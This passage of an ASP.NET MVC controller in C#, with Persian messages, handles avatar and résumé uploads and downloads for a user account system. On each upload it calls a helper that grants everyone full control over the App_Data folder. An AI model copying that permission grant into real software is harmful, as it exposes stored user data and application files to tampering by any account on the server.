			keyName: Resources.Strings.ActionsKeys.UploadAvatar)]
		public virtual System.Web.Mvc.ActionResult UploadAvatar()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			return (View(oUser));
		}

		[System.Web.Mvc.HttpPost]
		[System.Web.Mvc.ActionName("UploadAvatar")]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.UploadAvatar)]
		public virtual System.Web.Mvc.ActionResult UploadAvatarConfirmed()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			// **************************************************
			System.Web.HttpPostedFileBase oPostedFile = null;

			if (Request.Files.Count == 0)
			{
				ModelState.AddModelError
					(string.Empty, "فايلی برای آپلود مشخص نشده است!");
			}
			else
			{
				oPostedFile = Request.Files[0];

				string strErrorMessage =
					CheckPictrueValidation(oPostedFile);

				if (string.IsNullOrEmpty(strErrorMessage) == false)
				{
					ModelState.AddModelError(string.Empty, strErrorMessage);
				}
			}
			// **************************************************

			if (ModelState.IsValid)
			{
				// **************************************************
				string strParentPath =
					Server.MapPath("~/App_Data");

				Dtx.IO.Directory.SetFullControlForEveryOne(strParentPath);
				// **************************************************

				// **************************************************
				string strPath =
					string.Format("{0}\\UserAvatars", strParentPath);

				if (System.IO.Directory.Exists(strPath) == false)
				{
					System.IO.Directory.CreateDirectory(strPath);
				}
				// **************************************************

				// **************************************************
				string strExtension =
					System.IO.Path.GetExtension(oPostedFile.FileName).ToLower();

				string strPathName =
					string.Format("{0}\\{1}{2}", strPath, oUser.Id, strExtension);

				oPostedFile.SaveAs(strPathName);
				// **************************************************

				// **************************************************
				oUser.HasAvatar = true;
				oUser.AvatarExtension = strExtension;

				UnitOfWork.UserRepository.Update(oUser);

				UnitOfWork.Save();
				// **************************************************

				// عکس شما با موفقيت ارسال گرديد
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					Resources.Messages.Information004));

				return (View(oUser));
			}

			return (View(oUser));
		}

		private string CheckPictrueValidation(System.Web.HttpPostedFileBase postedFile)
		{
			string strErrorMessage = string.Empty;

			if (postedFile.ContentLength == 0)
			{
				strErrorMessage = "فايل به درستی آپلود نشده است!";
				return (strErrorMessage);
			}

			string strExtension =
				System.IO.Path.GetExtension(postedFile.FileName).ToLower();

			switch (strExtension)
			{
				case ".gif":
				case ".png":
				case ".jpg":
				case ".jpeg":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌های عکس تنها فرمت های JPG, GIF, PNG قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			string strContentType = postedFile.ContentType;

			switch (strContentType.ToLower())
			{
				case "image/gif":
				case "image/png":
				case "image/jpeg":
				case "image/pjpeg":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌های عکس تنها فرمت های JPG, GIF, PNG قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			return (strErrorMessage);
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.DisplayUserAvatar)]
		public virtual System.Web.Mvc.ActionResult DisplayUserAvatar
			(System.Guid? id = null, int? width = null, int? height = null)
		{
			if (id.HasValue == false)
			{
				return (Infrastructure.Image.NoPhoto(width, height));
			}

			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id == id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (Infrastructure.Image.NoPhoto(width, height));
			}

			if (oUser.IsActive == false)
			{
				return (Infrastructure.Image.AccessDenied(width, height));
			}

			string strFileName =
				string.Format("{0}{1}", oUser.Id, oUser.AvatarExtension);

			string strRootRelativePathName =
				string.Format("~/App_Data/UserAvatars/{0}", strFileName);

			string strPathName =
				Server.MapPath(strRootRelativePathName);

			if (System.IO.File.Exists(strPathName) == false)
			{
				return (Infrastructure.Image.NoPhoto(width, height));
			}

			System.IO.MemoryStream oMemoryStream =
				Infrastructure.Image.GetPhoto(strPathName, width, height);

			return (File(oMemoryStream.ToArray(),
				contentType: "image/jpeg", fileDownloadName: strFileName));
		}

		// *****

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.UploadResume)]
		public virtual System.Web.Mvc.ActionResult UploadResume()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			return (View(oUser));
		}

		[System.Web.Mvc.HttpPost]
		[System.Web.Mvc.ActionName("UploadResume")]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.UploadAvatar)]
		public virtual System.Web.Mvc.ActionResult UploadResumeConfirmed()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			// **************************************************
			System.Web.HttpPostedFileBase oPostedFile = null;

			if (Request.Files.Count == 0)
			{
				ModelState.AddModelError
					(string.Empty, "فايلی برای آپلود مشخص نشده است!");
			}
			else
			{
				oPostedFile = Request.Files[0];

				string strErrorMessage =
					CheckResumeValidation(oPostedFile);

				if (string.IsNullOrEmpty(strErrorMessage) == false)
				{
					ModelState.AddModelError(string.Empty, strErrorMessage);
				}
			}
			// **************************************************

			if (ModelState.IsValid)
			{
				// **************************************************
				string strParentPath =
					Server.MapPath("~/App_Data");

				Dtx.IO.Directory.SetFullControlForEveryOne(strParentPath);
				// **************************************************

				// **************************************************
				string strPath =
					string.Format("{0}\\UserResumes", strParentPath);

				if (System.IO.Directory.Exists(strPath) == false)
				{
					System.IO.Directory.CreateDirectory(strPath);
				}
				// **************************************************

				// **************************************************
				string strExtension =
					System.IO.Path.GetExtension(oPostedFile.FileName).ToLower();

				string strPathName =
					string.Format("{0}\\{1}{2}", strPath, oUser.Id, strExtension);

				oPostedFile.SaveAs(strPathName);
				// **************************************************

				// **************************************************
				oUser.HasResume = true;
				oUser.ResumeExtension = strExtension;

				UnitOfWork.UserRepository.Update(oUser);

				UnitOfWork.Save();
				// **************************************************

				// رزومه شما با موفقيت ارسال گرديد
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					Resources.Messages.Information005));

				return (View(oUser));
			}

			return (View(oUser));
		}

		private string CheckResumeValidation(System.Web.HttpPostedFileBase postedFile)
		{
			string strErrorMessage = string.Empty;

			if (postedFile.ContentLength == 0)
			{
				strErrorMessage = "فايل به درستی آپلود نشده است!";
				return (strErrorMessage);
			}

			string strExtension =
				System.IO.Path.GetExtension(postedFile.FileName).ToLower();

			switch (strExtension)
			{
				case ".doc":
				case ".pdf":
				case ".docx":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌ رزومه تنها فرمت های DOC, DOCX, PDF قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			string strContentType = postedFile.ContentType;

			switch (strContentType.ToLower())
			{
				case "application/pdf":
				case "application/msword":
				case "application/vnd.ms-word.document.12":
				case "application/vnd.openxmlformats-officedocument.wordprocessingml.document":
				{
					break;
				}

				default:
				{
					strErrorMessage =
						"برای فايل‌ رزومه تنها فرمت های DOC, DOCX, PDF قابل قبول می باشد!";
					return (strErrorMessage);
				}
			}

			return (strErrorMessage);
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.DownloadResume)]
		public virtual System.Web.Mvc.ActionResult DownloadResume(System.Guid? id = null)
		{
			if (id.HasValue == false)
			{
				return (null);
			}

			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id == id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (null);
			}

			if (oUser.IsActive == false)
			{
				return (null);
			}

			string strFileName =
				string.Format("{0}{1}", oUser.Id, oUser.ResumeExtension);

			string strRootRelativePathName =
				string.Format("~/App_Data/UserResumes/{0}", strFileName);

			string strPathName =
				Server.MapPath(strRootRelativePathName);

			if (System.IO.File.Exists(strPathName) == false)
			{
				return (null);
			}

			strFileName =
				string.Format("{0}{1}", oUser.FullName, oUser.ResumeExtension);

			switch (oUser.ResumeExtension.ToLower())
			{
				case ".doc":
				{
					return (File(strPathName,
						contentType: "application/msword",
						fileDownloadName: strFileName));
				}

				case ".docx":
				{
					return (File(strPathName,
						contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						fileDownloadName: strFileName));
				}

				case ".pdf":
				{
					return (File(strPathName,
						contentType: "application/pdf",
						fileDownloadName: strFileName));
				}

				default:
				{
					return (null);
				}
			}
		}
	}
}
